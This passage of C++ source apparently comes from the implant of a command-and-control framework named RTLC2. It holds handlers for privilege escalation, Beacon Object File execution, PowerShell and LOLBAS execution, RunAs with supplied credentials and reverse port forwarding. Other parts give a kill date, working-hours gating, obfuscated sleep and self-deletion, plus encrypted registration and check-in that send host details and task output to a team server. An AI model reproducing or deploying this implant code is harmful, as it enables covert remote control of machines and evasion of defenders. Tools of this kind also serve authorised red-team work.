                std::vector<uint8_t>(result.message.begin(), result.message.end())};
    };

    // --- Privilege Escalation (TaskType::PrivEsc = 30) ---
    handlers_[TaskType::PrivEsc] = [](const Task& t) -> TaskResult {
        auto techIt = t.params.find("technique");
        std::string technique = techIt != t.params.end() ? techIt->second : "";
        std::string payload(t.data.begin(), t.data.end());
        std::string output = modules::PrivEsc(technique, payload);
        return {t.task_id, output.find("Error") == std::string::npos ? 2 : 3,
                std::vector<uint8_t>(output.begin(), output.end())};
    };

    // BOF (Beacon Object File) execution handler
    handlers_[TaskType::BOF] = [](const Task& t) -> TaskResult {
        // Task data contains the raw COFF object file bytes
        // Optional params: "function" for custom entry point (default: "go")
        // Optional params: "args" for base64-encoded packed arguments
        std::string entryFunc = "go";
        auto funcIt = t.params.find("function");
        if (funcIt != t.params.end() && !funcIt->second.empty()) {
            entryFunc = funcIt->second;
        }

        std::vector<uint8_t> bofArgs;
        auto argsIt = t.params.find("args");
        if (argsIt != t.params.end() && !argsIt->second.empty()) {
            bofArgs = crypto::Base64Decode(argsIt->second);
        }

        bof::BOFResult bofResult = bof::Execute(t.data, entryFunc, bofArgs);

        int status = bofResult.success ? 2 : 3;
        std::string output = bofResult.output;
        if (!bofResult.success && bofResult.exit_code != 0 && bofResult.exit_code != -1) {
            output += " (exit code: " + std::to_string(bofResult.exit_code) + ")";
        }

        return {t.task_id, status, std::vector<uint8_t>(output.begin(), output.end())};
    };

    // --- File Copy (TaskType::FileCopy = 31) ---
    handlers_[TaskType::FileCopy] = [](const Task& t) -> TaskResult {
        auto srcIt = t.params.find("src");
        auto dstIt = t.params.find("dst");
        std::string src = srcIt != t.params.end() ? srcIt->second : "";
        std::string dst = dstIt != t.params.end() ? dstIt->second : "";

        if (src.empty() || dst.empty()) {
            std::string msg = "FileCopy: 'src' and 'dst' params required";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        bool ok = false;
#ifdef RTLC2_WINDOWS
        ok = CopyFileA(src.c_str(), dst.c_str(), FALSE) != 0;
#else
        {
            std::ifstream in(src, std::ios::binary);
            std::ofstream out(dst, std::ios::binary);
            if (in.is_open() && out.is_open()) {
                out << in.rdbuf();
                ok = out.good();
            }
        }
#endif
        std::string msg = ok ? "Copied: " + src + " -> " + dst
                             : "FileCopy failed: " + src + " -> " + dst;
        return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // --- File Move (TaskType::FileMove = 32) ---
    handlers_[TaskType::FileMove] = [](const Task& t) -> TaskResult {
        auto srcIt = t.params.find("src");
        auto dstIt = t.params.find("dst");
        std::string src = srcIt != t.params.end() ? srcIt->second : "";
        std::string dst = dstIt != t.params.end() ? dstIt->second : "";

        if (src.empty() || dst.empty()) {
            std::string msg = "FileMove: 'src' and 'dst' params required";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        bool ok = false;
#ifdef RTLC2_WINDOWS
        ok = MoveFileExA(src.c_str(), dst.c_str(), MOVEFILE_REPLACE_EXISTING) != 0;
#else
        ok = (rename(src.c_str(), dst.c_str()) == 0);
#endif
        std::string msg = ok ? "Moved: " + src + " -> " + dst
                             : "FileMove failed: " + src + " -> " + dst;
        return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // --- File Delete (TaskType::FileDelete = 33) ---
    handlers_[TaskType::FileDelete] = [](const Task& t) -> TaskResult {
        std::string path(t.data.begin(), t.data.end());
        if (path.empty()) {
            std::string msg = "FileDelete: file path required in data";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        bool ok = false;
#ifdef RTLC2_WINDOWS
        ok = DeleteFileA(path.c_str()) != 0;
#else
        ok = (unlink(path.c_str()) == 0);
#endif
        std::string msg = ok ? "Deleted: " + path : "FileDelete failed: " + path;
        return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // --- Make Directory (TaskType::MkDir = 34) ---
    handlers_[TaskType::MkDir] = [](const Task& t) -> TaskResult {
        std::string path(t.data.begin(), t.data.end());
        if (path.empty()) {
            std::string msg = "MkDir: directory path required in data";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        auto recursiveIt = t.params.find("recursive");
        bool recursive = (recursiveIt != t.params.end() && recursiveIt->second == "1");

        bool ok = false;
        if (recursive) {
            // Create parent directories as needed
            std::string current;
            for (size_t i = 0; i < path.size(); i++) {
                current += path[i];
                if (path[i] == '/' || path[i] == '\\' || i == path.size() - 1) {
                    if (current.empty()) continue;
#ifdef RTLC2_WINDOWS
                    CreateDirectoryA(current.c_str(), NULL);
#else
                    mkdir(current.c_str(), 0755);
#endif
                }
            }
            // Check if final directory exists
#ifdef RTLC2_WINDOWS
            DWORD attrs = GetFileAttributesA(path.c_str());
            ok = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY));
#else
            struct stat st;
            ok = (stat(path.c_str(), &st) == 0 && S_ISDIR(st.st_mode));
#endif
        } else {
#ifdef RTLC2_WINDOWS
            ok = CreateDirectoryA(path.c_str(), NULL) != 0;
            if (!ok) {
                // May already exist
                DWORD err = GetLastError();
                if (err == ERROR_ALREADY_EXISTS) ok = true;
            }
#else
            ok = (mkdir(path.c_str(), 0755) == 0 || errno == EEXIST);
#endif
        }

        std::string msg = ok ? "Directory created: " + path : "MkDir failed: " + path;
        return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // --- Registry Query (TaskType::RegQuery = 35) - Windows only ---
    handlers_[TaskType::RegQuery] = [](const Task& t) -> TaskResult {
#ifdef RTLC2_WINDOWS
        auto hiveIt = t.params.find("hive");
        auto pathIt = t.params.find("path");
        auto valueIt = t.params.find("value");

        std::string hiveName = hiveIt != t.params.end() ? hiveIt->second : "HKLM";
        std::string regPath = pathIt != t.params.end() ? pathIt->second : "";
        std::string valueName = valueIt != t.params.end() ? valueIt->second : "";

        if (regPath.empty()) {
            std::string msg = "RegQuery: 'path' param required";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        HKEY hRoot = HKEY_LOCAL_MACHINE;
        if (hiveName == "HKCU" || hiveName == "HKEY_CURRENT_USER") hRoot = HKEY_CURRENT_USER;
        else if (hiveName == "HKLM" || hiveName == "HKEY_LOCAL_MACHINE") hRoot = HKEY_LOCAL_MACHINE;
        else if (hiveName == "HKCR" || hiveName == "HKEY_CLASSES_ROOT") hRoot = HKEY_CLASSES_ROOT;
        else if (hiveName == "HKU" || hiveName == "HKEY_USERS") hRoot = HKEY_USERS;

        HKEY hKey = NULL;
        LONG res = RegOpenKeyExA(hRoot, regPath.c_str(), 0, KEY_READ, &hKey);
        if (res != ERROR_SUCCESS) {
            std::string msg = "RegQuery: failed to open key " + hiveName + "\\" + regPath +
                              " (error " + std::to_string(res) + ")";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        // If no value name specified, enumerate all values
        if (valueName.empty()) {
            std::ostringstream oss;
            oss << hiveName << "\\" << regPath << ":\n";
            char nameBuffer[256];
            BYTE dataBuffer[4096];
            DWORD nameSize, dataSize, type;
            for (DWORD idx = 0; ; idx++) {
                nameSize = sizeof(nameBuffer);
                dataSize = sizeof(dataBuffer);
                res = RegEnumValueA(hKey, idx, nameBuffer, &nameSize, NULL,
                                    &type, dataBuffer, &dataSize);
                if (res != ERROR_SUCCESS) break;

                oss << "  " << nameBuffer << " = ";
                switch (type) {
                    case REG_SZ:
                    case REG_EXPAND_SZ:
                        oss << (const char*)dataBuffer;
                        oss << " (" << (type == REG_SZ ? "REG_SZ" : "REG_EXPAND_SZ") << ")";
                        break;
                    case REG_DWORD:
                        oss << *(DWORD*)dataBuffer << " (REG_DWORD)";
                        break;
                    case REG_MULTI_SZ: {
                        oss << "\"";
                        const char* p = (const char*)dataBuffer;
                        while (*p) {
                            oss << p << "\\0";
                            p += strlen(p) + 1;
                        }
                        oss << "\" (REG_MULTI_SZ)";
                        break;
                    }
                    case REG_BINARY: {
                        oss << "0x";
                        for (DWORD b = 0; b < dataSize && b < 64; b++) {
                            char hex[4];
                            snprintf(hex, sizeof(hex), "%02X", dataBuffer[b]);
                            oss << hex;
                        }
                        if (dataSize > 64) oss << "...";
                        oss << " (REG_BINARY, " << dataSize << " bytes)";
                        break;
                    }
                    default:
                        oss << "(type " << type << ", " << dataSize << " bytes)";
                        break;
                }
                oss << "\n";
            }
            RegCloseKey(hKey);
            std::string output = oss.str();
            return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
        }

        // Query specific value
        BYTE dataBuffer[4096];
        DWORD dataSize = sizeof(dataBuffer);
        DWORD type = 0;
        res = RegQueryValueExA(hKey, valueName.c_str(), NULL, &type, dataBuffer, &dataSize);
        RegCloseKey(hKey);

        if (res != ERROR_SUCCESS) {
            std::string msg = "RegQuery: value '" + valueName + "' not found (error " + std::to_string(res) + ")";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        std::ostringstream oss;
        oss << hiveName << "\\" << regPath << ": " << valueName << " = ";
        switch (type) {
            case REG_SZ:
            case REG_EXPAND_SZ:
                oss << (const char*)dataBuffer;
                oss << " (" << (type == REG_SZ ? "REG_SZ" : "REG_EXPAND_SZ") << ")";
                break;
            case REG_DWORD:
                oss << *(DWORD*)dataBuffer << " (REG_DWORD)";
                break;
            case REG_MULTI_SZ: {
                oss << "\"";
                const char* p = (const char*)dataBuffer;
                while (*p) {
                    oss << p << "\\0";
                    p += strlen(p) + 1;
                }
                oss << "\" (REG_MULTI_SZ)";
                break;
            }
            case REG_BINARY: {
                oss << "0x";
                for (DWORD b = 0; b < dataSize && b < 64; b++) {
                    char hex[4];
                    snprintf(hex, sizeof(hex), "%02X", dataBuffer[b]);
                    oss << hex;
                }
                if (dataSize > 64) oss << "...";
                oss << " (REG_BINARY, " << dataSize << " bytes)";
                break;
            }
            default:
                oss << "(type " << type << ", " << dataSize << " bytes)";
                break;
        }
        std::string output = oss.str();
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
#else
        std::string msg = "Registry operations only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };

    // --- Environment Variable (TaskType::EnvVar = 36) ---
    handlers_[TaskType::EnvVar] = [](const Task& t) -> TaskResult {
        auto actionIt = t.params.find("action");
        auto nameIt = t.params.find("name");
        auto valueIt = t.params.find("value");
        std::string action = actionIt != t.params.end() ? actionIt->second : "get";
        std::string name = nameIt != t.params.end() ? nameIt->second : "";
        std::string value = valueIt != t.params.end() ? valueIt->second : "";

        if (action == "get") {
            if (name.empty()) {
                std::string msg = "EnvVar get: 'name' param required";
                return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
            }
            const char* val = getenv(name.c_str());
            std::string output = val ? name + "=" + val : name + " (not set)";
            return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
        } else if (action == "set") {
            if (name.empty()) {
                std::string msg = "EnvVar set: 'name' param required";
                return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
            }
            bool ok = false;
#ifdef RTLC2_WINDOWS
            ok = SetEnvironmentVariableA(name.c_str(), value.c_str()) != 0;
#else
            ok = (setenv(name.c_str(), value.c_str(), 1) == 0);
#endif
            std::string msg = ok ? "Set " + name + "=" + value : "Failed to set " + name;
            return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        } else if (action == "list") {
            std::ostringstream oss;
#ifdef RTLC2_WINDOWS
            LPCH envBlock = GetEnvironmentStrings();
            if (envBlock) {
                const char* p = envBlock;
                while (*p) {
                    oss << p << "\n";
                    p += strlen(p) + 1;
                }
                FreeEnvironmentStringsA(envBlock);
            }
#else
#ifdef __APPLE__
            char** envp = *_NSGetEnviron();
#else
            extern char** environ;
            char** envp = environ;
#endif
            for (char** env = envp; *env; env++) {
                oss << *env << "\n";
            }
#endif
            std::string output = oss.str();
            return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
        }

        std::string msg = "Unknown envvar action: " + action + ". Available: get, set, list";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // --- Reverse Port Forward (TaskType::RPortFwd = 37) ---
    handlers_[TaskType::RPortFwd] = [](const Task& t) -> TaskResult {
        auto actionIt = t.params.find("action");
        auto bindPortIt = t.params.find("bind_port");
        auto fwdHostIt = t.params.find("fwd_host");
        auto fwdPortIt = t.params.find("fwd_port");
        std::string action = actionIt != t.params.end() ? actionIt->second : "start";

        if (action == "start") {
            int bindPort = bindPortIt != t.params.end() ? std::atoi(bindPortIt->second.c_str()) : 0;
            std::string fwdHost = fwdHostIt != t.params.end() ? fwdHostIt->second : "";
            int fwdPort = fwdPortIt != t.params.end() ? std::atoi(fwdPortIt->second.c_str()) : 0;

            if (bindPort <= 0 || fwdHost.empty() || fwdPort <= 0) {
                std::string msg = "RPortFwd start: 'bind_port', 'fwd_host', 'fwd_port' params required";
                return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
            }

            std::string output = modules::StartRPortFwd(bindPort, fwdHost, fwdPort);
            bool ok = output.find("Error") == std::string::npos;
            return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(output.begin(), output.end())};
        } else if (action == "stop") {
            int bindPort = bindPortIt != t.params.end() ? std::atoi(bindPortIt->second.c_str()) : 0;
            if (bindPort <= 0) {
                std::string msg = "RPortFwd stop: 'bind_port' param required";
                return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
            }
            std::string output = modules::StopRPortFwd(bindPort);
            bool ok = output.find("Error") == std::string::npos;
            return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(output.begin(), output.end())};
        } else if (action == "list") {
            std::string output = modules::ListRPortFwd();
            return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
        }

        std::string msg = "Unknown rportfwd action: " + action + ". Available: start, stop, list";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
    };

    // --- RunAs (TaskType::RunAs = 38) - Windows only ---
    handlers_[TaskType::RunAs] = [](const Task& t) -> TaskResult {
#ifdef RTLC2_WINDOWS
        auto userIt = t.params.find("user");
        auto passIt = t.params.find("password");
        auto domainIt = t.params.find("domain");
        auto cmdIt = t.params.find("command");

        std::string user = userIt != t.params.end() ? userIt->second : "";
        std::string password = passIt != t.params.end() ? passIt->second : "";
        std::string domain = domainIt != t.params.end() ? domainIt->second : ".";
        std::string command = cmdIt != t.params.end() ? cmdIt->second :
            std::string(t.data.begin(), t.data.end());

        if (user.empty() || command.empty()) {
            std::string msg = "RunAs: 'user' and 'command' params required";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        // Convert strings to wide chars
        int wUserLen = MultiByteToWideChar(CP_ACP, 0, user.c_str(), -1, NULL, 0);
        int wPassLen = MultiByteToWideChar(CP_ACP, 0, password.c_str(), -1, NULL, 0);
        int wDomainLen = MultiByteToWideChar(CP_ACP, 0, domain.c_str(), -1, NULL, 0);

        std::vector<WCHAR> wUser(wUserLen), wPass(wPassLen), wDomain(wDomainLen);
        MultiByteToWideChar(CP_ACP, 0, user.c_str(), -1, wUser.data(), wUserLen);
        MultiByteToWideChar(CP_ACP, 0, password.c_str(), -1, wPass.data(), wPassLen);
        MultiByteToWideChar(CP_ACP, 0, domain.c_str(), -1, wDomain.data(), wDomainLen);

        // Create pipe for stdout capture
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        HANDLE hReadOut, hWriteOut;
        CreatePipe(&hReadOut, &hWriteOut, &sa, 0);
        SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOW si = { sizeof(si) };
        si.hStdOutput = hWriteOut;
        si.hStdError = hWriteOut;
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};

        // Build command line as wide string
        std::string cmdLine = "cmd.exe /c " + command;
        int wCmdLen = MultiByteToWideChar(CP_ACP, 0, cmdLine.c_str(), -1, NULL, 0);
        std::vector<WCHAR> wCmd(wCmdLen);
        MultiByteToWideChar(CP_ACP, 0, cmdLine.c_str(), -1, wCmd.data(), wCmdLen);

        BOOL created = CreateProcessWithLogonW(
            wUser.data(), wDomain.data(), wPass.data(),
            LOGON_WITH_PROFILE, NULL, wCmd.data(),
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        CloseHandle(hWriteOut);

        if (!created) {
            CloseHandle(hReadOut);
            std::string msg = "RunAs failed (error " + std::to_string(GetLastError()) + ")";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        // Wait for process with timeout (30s)
        WaitForSingleObject(pi.hProcess, 30000);

        // Read output
        std::string output;
        char buf[4096];
        DWORD bytesRead;
        while (ReadFile(hReadOut, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            output += buf;
        }

        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);

        CloseHandle(hReadOut);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (output.empty()) {
            output = "RunAs completed (exit code: " + std::to_string(exitCode) + ")";
        }
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
#else
        std::string msg = "RunAs only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };

    // --- PowerShell (TaskType::PowerShell = 39) ---
    handlers_[TaskType::PowerShell] = [](const Task& t) -> TaskResult {
        std::string script;
        auto scriptIt = t.params.find("script");
        if (scriptIt != t.params.end() && !scriptIt->second.empty()) {
            script = scriptIt->second;
        } else if (!t.data.empty()) {
            script = std::string(t.data.begin(), t.data.end());
        }

        if (script.empty()) {
            std::string msg = "PowerShell: script data or 'script' param required";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        std::string output = execution::ExecutePowerShell(script);
        bool ok = output.find("Error:") != 0; // success if not starting with "Error:"
        return {t.task_id, ok ? 2 : 3, std::vector<uint8_t>(output.begin(), output.end())};
    };

    // --- LOLBAS (TaskType::LOLBAS = 40) - Windows only ---
    handlers_[TaskType::LOLBAS] = [](const Task& t) -> TaskResult {
#ifdef RTLC2_WINDOWS
        auto binaryIt = t.params.find("binary");
        auto argsIt = t.params.find("args");
        std::string binary = binaryIt != t.params.end() ? binaryIt->second : "";
        std::string args = argsIt != t.params.end() ? argsIt->second : "";

        if (binary.empty()) {
            std::string msg = "LOLBAS: 'binary' param required";
            return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
        }

        std::string output = execution::LOLBASExec(binary, args);
        return {t.task_id, 2, std::vector<uint8_t>(output.begin(), output.end())};
#else
        std::string msg = "LOLBAS only available on Windows";
        return {t.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
#endif
    };
}

bool Agent::IsOperationalTime() {
    // Check kill date
    if (RTLC2_KILL_DATE != 0) {
        time_t now = time(nullptr);
        if (now >= (time_t)RTLC2_KILL_DATE) {
            return false;
        }
    }

    // Check working hours
    if (RTLC2_WORK_START_HOUR != 0 || RTLC2_WORK_END_HOUR != 0) {
        time_t now = time(nullptr);
        struct tm tm_buf;
#ifdef RTLC2_WINDOWS
        localtime_s(&tm_buf, &now);
#else
        localtime_r(&now, &tm_buf);
#endif
        int currentHour = tm_buf.tm_hour;
        int currentDay = tm_buf.tm_wday; // 0=Sun, 6=Sat

        // Check working days bitmask
        if (RTLC2_WORK_DAYS != 127) { // 127 = all days
            if (!(RTLC2_WORK_DAYS & (1 << currentDay))) {
                return false;
            }
        }

        // Check working hours
        if (RTLC2_WORK_START_HOUR != 0 && RTLC2_WORK_END_HOUR != 0) {
            if (RTLC2_WORK_START_HOUR <= RTLC2_WORK_END_HOUR) {
                // Normal range (e.g., 8-17)
                if (currentHour < RTLC2_WORK_START_HOUR || currentHour >= RTLC2_WORK_END_HOUR) {
                    return false;
                }
            } else {
                // Overnight range (e.g., 22-6)
                if (currentHour < RTLC2_WORK_START_HOUR && currentHour >= RTLC2_WORK_END_HOUR) {
                    return false;
                }
            }
        }
    }

    return true;
}

void Agent::Run() {
    running_ = true;

#ifdef RTLC2_DEBUG
    fprintf(stderr, "[agent] connecting to %s:%d (tls=%d)\n",
            config_.c2_host.c_str(), config_.c2_port, config_.use_tls);
#endif

    while (running_) {
        // Register (or re-register) with team server
        agent_id_.clear();
        session_key_.clear();

        int reg_attempts = 0;
        while (running_ && !Register()) {
            reg_attempts++;
#ifdef RTLC2_DEBUG
            fprintf(stderr, "[agent] register failed (attempt %d), retrying in %ds...\n",
                    reg_attempts, config_.sleep_interval);
#endif
            // Exponential backoff: cap at 5 minutes
            int backoff = config_.sleep_interval * (reg_attempts < 6 ? reg_attempts : 6);
            if (backoff > 300) backoff = 300;
            evasion::ObfuscatedSleep(backoff, config_.jitter);
        }

#ifdef RTLC2_DEBUG
        if (running_) fprintf(stderr, "[agent] registered as %s\n", agent_id_.c_str());
#endif

        // Main checkin loop
        int consecutive_failures = 0;
        while (running_ && consecutive_failures < 3) {
            // Check operational time constraints (kill date, working hours)
            if (!IsOperationalTime()) {
                // If past kill date, self-destruct
                if (RTLC2_KILL_DATE != 0 && time(nullptr) >= (time_t)RTLC2_KILL_DATE) {
                    SelfDestruct();
                    return;
                }
                // Outside working hours - sleep and check again
                evasion::ObfuscatedSleep(config_.sleep_interval, config_.jitter);
                continue;
            }
            if (Checkin()) {
                consecutive_failures = 0;
            } else {
                consecutive_failures++;
#ifdef RTLC2_DEBUG
                fprintf(stderr, "[agent] checkin failed (%d/3), will re-register if needed\n",
                        consecutive_failures);
#endif
            }
            evasion::ObfuscatedSleep(config_.sleep_interval, config_.jitter);
        }

        // If we got here from failed checkins, re-register
        if (running_) {
#ifdef RTLC2_DEBUG
            fprintf(stderr, "[agent] lost session, re-registering...\n");
#endif
            evasion::ObfuscatedSleep(config_.sleep_interval, config_.jitter);
        }
    }
}

bool Agent::Register() {
    crypto::AES256 cipher;
    if (!cipher.Init(config_.aes_key)) {
#ifdef RTLC2_DEBUG
        fprintf(stderr, "[agent] AES init failed (key: %s...)\n", config_.aes_key.substr(0, 8).c_str());
#endif
        return false;
    }

    // Build registration JSON
    std::ostringstream json_ss;
    json_ss << "{";
    json_ss << json::to_string("hostname", sysinfo_.hostname) << ",";
    json_ss << json::to_string("username", sysinfo_.username) << ",";
    json_ss << json::to_string("os", sysinfo_.os_name) << ",";
    json_ss << json::to_string("arch", sysinfo_.arch) << ",";
    json_ss << json::to_string("process_name", sysinfo_.process_name) << ",";
    json_ss << json::to_string("pid", sysinfo_.pid) << ",";
    json_ss << json::to_string("internal_ip", sysinfo_.internal_ip) << ",";
    json_ss << json::to_string("integrity", sysinfo_.integrity);
    json_ss << "}";

    std::string payload = json_ss.str();
    auto encrypted = cipher.Encrypt(payload);
    if (encrypted.empty()) return false;

    // Send registration using the configured transport
    transport::Response response;
    std::string transportType = RTLC2_TRANSPORT_TYPE;
    if (transportType == "http") {
        // HTTP transport supports path-based routing
        auto* http = static_cast<transport::HTTPTransport*>(transport_.get());
        response = http->Post(RTLC2_REGISTER_URI, encrypted);
    } else {
        // Non-HTTP transports use Send() directly (server routes by protocol)
        response = transport_->Send(encrypted);
    }

    if (!response.success || response.status_code != 200) {
#ifdef RTLC2_DEBUG
        fprintf(stderr, "[agent] register failed (success=%d, status=%d, error=%s)\n",
                response.success, response.status_code, response.error.c_str());
#endif
        return false;
    }

#ifdef RTLC2_DEBUG
    fprintf(stderr, "[agent] register response: status=%d, body_size=%zu\n",
            response.status_code, response.body.size());
#endif

    // Decrypt response
    auto decrypted = cipher.Decrypt(response.body);
    if (decrypted.empty()) {
#ifdef RTLC2_DEBUG
        fprintf(stderr, "[agent] register: decryption failed\n");
#endif
        return false;
    }

#ifdef RTLC2_DEBUG
    fprintf(stderr, "[agent] register: decryption succeeded (%zu bytes)\n", decrypted.size());
#endif

    std::string resp_json(decrypted.begin(), decrypted.end());
    agent_id_ = json::extract_string(resp_json, "agent_id");
    session_key_ = json::extract_string(resp_json, "session_key");

#ifdef RTLC2_DEBUG
    fprintf(stderr, "[agent] register: agent_id=%s, session_key=%s\n",
            agent_id_.empty() ? "(empty)" : agent_id_.c_str(),
            session_key_.empty() ? "(empty)" : "(present)");
#endif

    return !agent_id_.empty() && !session_key_.empty();
}

bool Agent::Checkin() {
    crypto::AES256 session_cipher;
    if (!session_cipher.Init(session_key_)) {
#ifdef RTLC2_DEBUG
        fprintf(stderr, "[agent] checkin: session cipher init failed\n");
#endif
        return false;
    }

#ifdef RTLC2_DEBUG
    fprintf(stderr, "[agent] checkin: sending with %zu pending results\n", pending_results_.size());
#endif

    // Build checkin JSON with results
    std::ostringstream json_ss;
    json_ss << "{" << json::to_string("agent_id", agent_id_);

    if (!pending_results_.empty()) {
        json_ss << ",\"results\":[";
        for (size_t i = 0; i < pending_results_.size(); i++) {
            if (i > 0) json_ss << ",";
            json_ss << "{";
            json_ss << json::to_string("task_id", pending_results_[i].task_id) << ",";
            json_ss << json::to_string("status", pending_results_[i].status) << ",";
            // Base64 encode output
            std::string b64_output = crypto::Base64Encode(pending_results_[i].output);
            json_ss << "\"output\":\"" << json::escape(b64_output) << "\"";
            json_ss << "}";
        }
        json_ss << "]";
        pending_results_.clear();
    }
    json_ss << "}";

    std::string payload = json_ss.str();
    auto encrypted = session_cipher.Encrypt(payload);
    if (encrypted.empty()) return false;

    // Prepend agent ID (8 bytes) as plaintext for server routing
    std::vector<uint8_t> send_data;
    send_data.insert(send_data.end(), agent_id_.begin(), agent_id_.end());
    send_data.insert(send_data.end(), encrypted.begin(), encrypted.end());

    // Send check-in using the configured transport
    transport::Response response;
    std::string transportType = RTLC2_TRANSPORT_TYPE;
    if (transportType == "http") {
        auto* http = static_cast<transport::HTTPTransport*>(transport_.get());
        response = http->Post(RTLC2_CHECKIN_URI, send_data);
    } else {
        response = transport_->Send(send_data);
    }

    if (!response.success || response.status_code != 200) {
#ifdef RTLC2_DEBUG
        fprintf(stderr, "[agent] checkin failed (success=%d, status=%d, error=%s)\n",
                response.success, response.status_code, response.error.c_str());
#endif
        return false;
    }

#ifdef RTLC2_DEBUG
    fprintf(stderr, "[agent] checkin response: status=%d, body_size=%zu\n",
            response.status_code, response.body.size());
#endif

    if (response.body.empty()) return true; // No tasks

    // Decrypt response
    auto decrypted = session_cipher.Decrypt(response.body);
    if (decrypted.empty()) {
#ifdef RTLC2_DEBUG
        fprintf(stderr, "[agent] checkin: decryption failed\n");
#endif
        return false;
    }

    // Parse tasks from response
    std::string resp_json(decrypted.begin(), decrypted.end());

    // Simple task parsing: look for task objects in "tasks" array
    // Format: {"tasks":[{"task_id":"xxx","type":1,"data":"base64"},...]}
#ifdef RTLC2_DEBUG
    size_t results_before = pending_results_.size();
#endif
    ParseAndExecuteTasks(resp_json);
#ifdef RTLC2_DEBUG
    size_t tasks_received = pending_results_.size() - results_before;
    fprintf(stderr, "[agent] checkin: received and executed %zu tasks\n", tasks_received);
#endif

    return true;
}

void Agent::ParseAndExecuteTasks(const std::string& json_str) {
    // Find tasks array
    auto tasks_pos = json_str.find("\"tasks\":[");
    if (tasks_pos == std::string::npos) return;

    // Extract individual task objects
    size_t pos = json_str.find("{", tasks_pos + 9);
    while (pos != std::string::npos && pos < json_str.length()) {
        auto end = json_str.find("}", pos);
        if (end == std::string::npos) break;

        std::string task_json = json_str.substr(pos, end - pos + 1);

        Task task;
        task.task_id = json::extract_string(task_json, "task_id");

        // Extract type as integer
        auto type_pos = task_json.find("\"type\":");
        if (type_pos != std::string::npos) {
            int type_val = std::atoi(task_json.c_str() + type_pos + 7);
            task.type = static_cast<TaskType>(type_val);
        }

        // Extract data (base64 encoded)
        std::string data_b64 = json::extract_string(task_json, "data");
        if (!data_b64.empty()) {
            task.data = crypto::Base64Decode(data_b64);
        }

        // Extract params (key-value pairs from JSON object)
        task.params = json::extract_params(task_json);

        // Execute task
        auto result = ExecuteTask(task);
        pending_results_.push_back(result);

        pos = json_str.find("{", end + 1);
    }
}

TaskResult Agent::ExecuteTask(const Task& task) {
    auto it = handlers_.find(task.type);
    if (it != handlers_.end()) {
        return it->second(task);
    }

    std::string msg = "Unknown task type: " + std::to_string(static_cast<int>(task.type));
    return {task.task_id, 3, std::vector<uint8_t>(msg.begin(), msg.end())};
}

void Agent::Stop() {
    running_ = false;
    g_jobManager.StopAll();
}

void Agent::SelfDestruct() {
    running_ = false;
    g_jobManager.StopAll();

#ifdef RTLC2_WINDOWS
    // Get our own executable path
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    // Mark for deletion on next reboot
    MoveFileExA(exePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    ExitProcess(0);
#elif defined(RTLC2_LINUX)
    // Linux: read /proc/self/exe link and unlink
    char exePath[4096] = {};
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len > 0) {
        exePath[len] = '\0';
        unlink(exePath);
    }
    exit(0);
#elif defined(RTLC2_MACOS)
    // macOS: get executable path and unlink
    char exePath[4096] = {};
    uint32_t pathLen = sizeof(exePath);
    if (_NSGetExecutablePath(exePath, &pathLen) == 0) {
        unlink(exePath);
    }
    exit(0);
#endif
}

SystemInfo Agent::GatherSystemInfo() {
    return modules::GetSystemInfo();
}

int Agent::CalculateSleep() {
